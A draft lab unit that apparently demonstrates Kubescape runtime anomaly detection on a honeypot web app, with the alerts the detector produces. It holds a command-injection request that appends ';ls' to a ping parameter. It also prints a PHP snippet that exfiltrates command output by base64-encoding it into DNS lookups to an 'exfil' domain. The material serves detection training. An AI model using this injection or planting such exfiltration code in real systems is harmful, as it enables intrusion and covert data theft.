---
kind: unit

title: Verify the anomaly detection

name: hello-test
---


## SKETCH  (this will be moved )


We now verify that kubescape is now watching for anything that was not previously recorded as `benign` .




TODO: C wants to implement specifically an exfiltration usecase: where the app is not just doing a ping, but sending telemetry to the maintainers for debugging purposes. Can we estimate the increase in detection rates if we include known telemetry network endpoints into the BoB? (Task for C)

### 1) Normal anomalies: A malicious runtime behaviour by executing a simple injection like so:

in Tab 1 tail the logs again
```sh
kubectl logs -n honey -l app=node-agent -f -c node-agent
```
and in Tab 2, let's do something malicious

```sh
curl localhost:8080/ping.php?ip=172.16.0.2\;ls
```
In the other tab, you should now see unexpected things:
```json
{"BaseRuntimeMetadata":{"alertName":"Unexpected process launched","arguments":{"args":["/bin/ls"],"exec":"/bin/ls","retval":0},"infectedPID":6972,"severity":5,"size":"4.1 kB","timestamp":"2025-05-14T09:41:34.973055288Z","trace":{}},"CloudMetadata":null,"RuleID":"R0001","RuntimeK8sDetails":{"clusterName":"honeycluster","containerName":"ping-app","hostNetwork":false,"image":"ghcr.io/k8sstormcenter/webapp@sha256:e323014ec9befb76bc551f8cc3bf158120150e2e277bae11844c2da6c56c0a2b","imageDigest":"sha256:c622cf306b94e8a6e7cfd718f048015e033614170f19228d8beee23a0ccc57bb","namespace":"default","containerID":"2b3c4de694b3e5668c920cea48db530892eda11c4984552a7457b7f5af701d9c","podName":"webapp-d87cdd796-4ltvq","podNamespace":"default","podLabels":{"app":"webapp","pod-template-hash":"d87cdd796"},"workloadName":"webapp","workloadNamespace":"default","workloadKind":"Deployment"},"RuntimeProcessDetails":{"processTree":{"pid":6950,"cmdline":"/bin/sh -c ping -c 4 172.16.0.2;ls","comm":"sh","ppid":5180,"pcomm":"apache2","hardlink":"/bin/dash","uid":33,"gid":33,"startTime":"0001-01-01T00:00:00Z","upperLayer":false,"cwd":"/var/www/html","path":"/bin/dash","childrenMap":{"ls␟6972":{"pid":6972,"cmdline":"/bin/ls ","comm":"ls","ppid":6950,"pcomm":"sh","hardlink":"/bin/ls","uid":33,"gid":33,"startTime":"0001-01-01T00:00:00Z","upperLayer":false,"cwd":"/var/www/html","path":"/bin/ls"}}},"containerID":"2b3c4de694b3e5668c920cea48db530892eda11c4984552a7457b7f5af701d9c"},"event":{"runtime":{"runtimeName":"containerd","containerId":"2b3c4de694b3e5668c920cea48db530892eda11c4984552a7457b7f5af701d9c","containerName":"ping-app","containerImageName":"ghcr.io/k8sstormcenter/webapp@sha256:e323014ec9befb76bc551f8cc3bf158120150e2e277bae11844c2da6c56c0a2b","containerImageDigest":"sha256:c622cf306b94e8a6e7cfd718f048015e033614170f19228d8beee23a0ccc57bb"},"k8s":{"namespace":"default","podName":"webapp-d87cdd796-4ltvq","podLabels":{"app":"webapp","pod-template-hash":"d87cdd796"},"containerName":"ping-app","owner":{}},"timestamp":1747215694973055288,"type":"normal"},"level":"error","message":"Unexpected process launched: /bin/ls","msg":"Unexpected process launched","time":"2025-05-14T09:41:34Z"}
{"BaseRuntimeMetadata":{"alertName":"Unexpected file access","arguments":{"flags":["O_RDONLY","O_NONBLOCK","O_DIRECTORY","O_CLOEXEC"],"path":"/var/www/html"},"infectedPID":6972,"severity":1,"timestamp":"2025-05-14T09:41:34.975867565Z","trace":{}},"CloudMetadata":null,"RuleID":"R0002","RuntimeK8sDetails":{"clusterName":"honeycluster","containerName":"ping-app","hostNetwork":false,"image":"ghcr.io/k8sstormcenter/webapp@sha256:e323014ec9befb76bc551f8cc3bf158120150e2e277bae11844c2da6c56c0a2b","imageDigest":"sha256:c622cf306b94e8a6e7cfd718f048015e033614170f19228d8beee23a0ccc57bb","namespace":"default","containerID":"2b3c4de694b3e5668c920cea48db530892eda11c4984552a7457b7f5af701d9c","podName":"webapp-d87cdd796-4ltvq","podNamespace":"default","workloadName":"webapp","workloadNamespace":"default","workloadKind":"Deployment"},"RuntimeProcessDetails":{"processTree":{"pid":6950,"cmdline":"/bin/sh -c ping -c 4 172.16.0.2;ls","comm":"sh","ppid":5180,"pcomm":"apache2","hardlink":"/bin/dash","uid":33,"gid":33,"startTime":"0001-01-01T00:00:00Z","upperLayer":false,"cwd":"/var/www/html","path":"/bin/dash","childrenMap":{"ls␟6972":{"pid":6972,"cmdline":"/bin/ls ","comm":"ls","ppid":6950,"pcomm":"sh","hardlink":"/bin/ls","uid":33,"gid":33,"startTime":"0001-01-01T00:00:00Z","upperLayer":false,"cwd":"/var/www/html","path":"/bin/ls"}}},"containerID":"2b3c4de694b3e5668c920cea48db530892eda11c4984552a7457b7f5af701d9c"},"event":{"runtime":{"runtimeName":"containerd","containerId":"2b3c4de694b3e5668c920cea48db530892eda11c4984552a7457b7f5af701d9c","containerName":"ping-app","containerImageName":"ghcr.io/k8sstormcenter/webapp@sha256:e323014ec9befb76bc551f8cc3bf158120150e2e277bae11844c2da6c56c0a2b","containerImageDigest":"sha256:c622cf306b94e8a6e7cfd718f048015e033614170f19228d8beee23a0ccc57bb"},"k8s":{"namespace":"default","podName":"webapp-d87cdd796-4ltvq","podLabels":{"app":"webapp","pod-template-hash":"d87cdd796"},"containerName":"ping-app","owner":{}},"timestamp":1747215694975867565,"type":"normal"},"level":"error","message":"Unexpected file access: /var/www/html with flags O_RDONLY,O_NONBLOCK,O_DIRECTORY,O_CLOEXEC","msg":"Unexpected file access","time":"2025-05-14T09:41:34Z"}
```

### 2) A malicious behaviour cause by the artefact having been tampered with in the supply chain:

WIP: this part is not written yet , but src code is there


```php
    // Exfiltrate each line of the ping result via DNS query
    $encoded_line = base64_encode($line); // Encode the line to make it DNS-safe
    $dns_query = $encoded_line . ".exfil.k8sstormcenter.com";
    exec("nslookup $dns_query > /dev/null 2>&1"); // Send the DNS query
```




